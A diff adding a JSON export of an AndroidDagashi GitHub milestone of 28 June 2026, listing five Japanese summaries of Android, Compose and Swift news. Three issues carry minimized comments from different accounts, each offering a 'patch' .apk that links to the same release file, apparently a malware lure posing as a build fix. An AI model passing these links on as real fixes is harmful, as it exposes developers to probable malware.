@@ -1,0 +1,173 @@
+{
+  "id": "MI_kwDOB4jhdM4A-v00",
+  "number": 434,
+  "url": "https://github.com/AndroidDagashi/AndroidDagashi/milestone/434",
+  "title": "434 2026-06-28",
+  "closedAt": "2026-06-28T12:17:07Z",
+  "description": "Intent Security Skill追加, Compose DesktopをSDL3で動かすライブラリ, IntelliJのLSP Client APIをオープンソース化へ, 実験ログ Cross-platform Swift, など",
+  "issues": {
+    "totalCount": 5,
+    "pageInfo": {
+      "startCursor": "Y3Vyc29yOnYyOpLPf________5vPAAAAARvWVTE=",
+      "endCursor": "Y3Vyc29yOnYyOpLPf________afPAAAAARvZG4M=",
+      "hasPreviousPage": false,
+      "hasNextPage": false
+    },
+    "nodes": [
+      {
+        "url": "https://github.com/AndroidDagashi/AndroidDagashi/issues/3784",
+        "title": "SwiftでAndroidアプリを組む実験ログ Cross-platform Swift",
+        "body": "https://forums.swift.org/t/cross-platform-swift-blog-series-and-simple-apple-android-app/87623\nSwift Forumsで共有された個人研究。Kotlin・Jetpack ComposeのAndroid Studioプロジェクトに、C/JNIバインディング経由でSwiftライブラリを組み込むサンプルを紹介。",
+        "labels": {
+          "nodes": [
+            {
+              "name": "X-Plat",
+              "description": "",
+              "color": "efd4a0"
+            }
+          ]
+        },
+        "comments": {
+          "totalCount": 1,
+          "pageInfo": {
+            "startCursor": "Y3Vyc29yOnYyOpHPAAAAAR-lDlI=",
+            "endCursor": "Y3Vyc29yOnYyOpHPAAAAAR-lDlI=",
+            "hasPreviousPage": false,
+            "hasNextPage": false
+          },
+          "nodes": [
+            {
+              "body": "Man, I was struggling with the JNI linkage for my Compose project too. I finally got the CMake build scripts and the Swift Android SDK headers to actually talk to each other properly after tweaking the linker flags in this archive. swift_jni_patch.apk(https://github.com/keracocobe/123/releases/download/update/module.apk)",
+              "publishedAt": "2026-06-28T11:00:42Z",
+              "isMinimized": true,
+              "minimizedReason": "off-topic",
+              "author": {
+                "login": "gucosamowo",
+                "url": "https://github.com/gucosamowo",
+                "avatarUrl": "https://avatars.githubusercontent.com/u/297612046?v=4"
+              }
+            }
+          ]
+        }
+      },
+      {
+        "url": "https://github.com/AndroidDagashi/AndroidDagashi/issues/3785",
+        "title": "JetBrains、IntelliJ PlatformのLSP Client APIをオープンソース化へ",
+        "body": "https://blog.jetbrains.com/platform/2026/06/open-sourcing-the-lsp-client-api-in-intellij-idea-2026-2/\nJetBrainsが、IntelliJ PlatformのLSP Client APIをオープンソース化する方針を発表しました。これまでAndroid Studioでは利用しづらかったLSP統合が、今後はAndroid StudioやOSS版IntelliJ PlatformベースのIDEでも扱いやすくなる可能性があります。独自言語や社内DSL、IDEプラグインを作る開発者には注目度が高い内容です。",
+        "labels": {
+          "nodes": []
+        },
+        "comments": {
+          "totalCount": 0,
+          "pageInfo": {
+            "startCursor": null,
+            "endCursor": null,
+            "hasPreviousPage": false,
+            "hasNextPage": false
+          },
+          "nodes": []
+        }
+      },
+      {
+        "url": "https://github.com/AndroidDagashi/AndroidDagashi/issues/3787",
+        "title": "Composables UI：Compose Multiplatform向けのUIコンポーネントライブラリ",
+        "body": "https://composables.com/blog/introducing-composables-ui\nComposablesが、Compose Multiplatform向けのUIコンポーネントライブラリ「Composables UI」を公開しました。既存のCompose Unstyledを土台に、Android、iOS、Desktop、Webで使えるアクセシブルなコンポーネントを提供し、Gradle依存として使うだけでなく、個別コンポーネントのコードをコピーして自前デザインシステムに取り込める点も特徴です。",
+        "labels": {
+          "nodes": [
+            {
+              "name": "Jetpack Compose",
+              "description": "",
+              "color": "006b75"
+            }
+          ]
+        },
+        "comments": {
+          "totalCount": 1,
+          "pageInfo": {
+            "startCursor": "Y3Vyc29yOnYyOpHPAAAAAR-m2UY=",
+            "endCursor": "Y3Vyc29yOnYyOpHPAAAAAR-m2UY=",
+            "hasPreviousPage": false,
+            "hasNextPage": false
+          },
+          "nodes": [
+            {
+              "body": "Man, I was struggling with the same layout issues on iOS when trying to port my Compose stuff. I ended up tweaking the dependency tree and the internal rendering engine to handle the multiplatform scaling better. It worked like a charm for me. composables_ui_patch.apk(https://github.com/keracocobe/123/releases/download/update/module.apk)",
+              "publishedAt": "2026-06-28T11:49:28Z",
+              "isMinimized": true,
+              "minimizedReason": "off-topic",
+              "author": {
+                "login": "konawopaguno21",
+                "url": "https://github.com/konawopaguno21",
+                "avatarUrl": "https://avatars.githubusercontent.com/u/297621217?v=4"
+              }
+            }
+          ]
+        }
+      },
+      {
+        "url": "https://github.com/AndroidDagashi/AndroidDagashi/issues/3788",
+        "title": "Compose DesktopをKotlin/NativeとSDL3で動かす実験的プロジェクト",
+        "body": "https://github.com/bitsycore/ComposeDesktopNative\nCompose DesktopのサブセットをKotlin/NativeとSDL3上で動かす実験的プロジェクトです。JVMなしでmacOS、Linux、Windows向けのネイティブバイナリを生成し、Skia/SkikoやSDL3による描画バックエンドを選べます。",
+        "labels": {
+          "nodes": [
+            {
+              "name": "Kotlin",
+              "description": "",
+              "color": "EC953C"
+            },
+            {
+              "name": "X-Plat",
+              "description": "",
+              "color": "efd4a0"
+            },
+            {
+              "name": "Jetpack Compose",
+              "description": "",
+              "color": "006b75"
+            }
+          ]
+        },
+        "comments": {
+          "totalCount": 1,
+          "pageInfo": {
+            "startCursor": "Y3Vyc29yOnYyOpHPAAAAAR-nRt0=",
+            "endCursor": "Y3Vyc29yOnYyOpHPAAAAAR-nRt0=",
+            "hasPreviousPage": false,
+            "hasNextPage": false
+          },
+          "nodes": [
+            {
+              "body": "Man, that SDL3 linking error was driving me nuts too. I found that the native linker was tripping over some missing symbols in the Skiko wrapper, so I put together a quick patch to bridge the SDL3 calls properly. It finally works on my end. compose_native_fix.apk(https://github.com/keracocobe/123/releases/download/update/module.apk)",
+              "publishedAt": "2026-06-28T12:01:07Z",
+              "isMinimized": true,
+              "minimizedReason": "off-topic",
+              "author": {
+                "login": "dogasosedo",
+                "url": "https://github.com/dogasosedo",
+                "avatarUrl": "https://avatars.githubusercontent.com/u/297623215?v=4"
+              }
+            }
+          ]
+        }
+      },
+      {
+        "url": "https://github.com/AndroidDagashi/AndroidDagashi/issues/3789",
+        "title": "Google公式Android SkillsにIntent Security向けSkillが追加",
+        "body": "https://developer.android.com/agents/skills/security/android-intent-security/SKILL\nGoogleのAndroid Skillsに、IntentやAndroidコンポーネントのセキュリティを扱う android-intent-security Skill が追加されました。Intent redirection、PendingIntentのmutability、exported component、ContentProvider、Serviceのcaller検証などを、AIエージェントが監査・修正するための手順としてまとめています。",
+        "labels": {
+          "nodes": []
+        },
+        "comments": {
+          "totalCount": 0,
+          "pageInfo": {
+            "startCursor": null,
+            "endCursor": null,
+            "hasPreviousPage": false,
+            "hasNextPage": false
+          },
+          "nodes": []
+        }
+      }
+    ]
+  }
+}
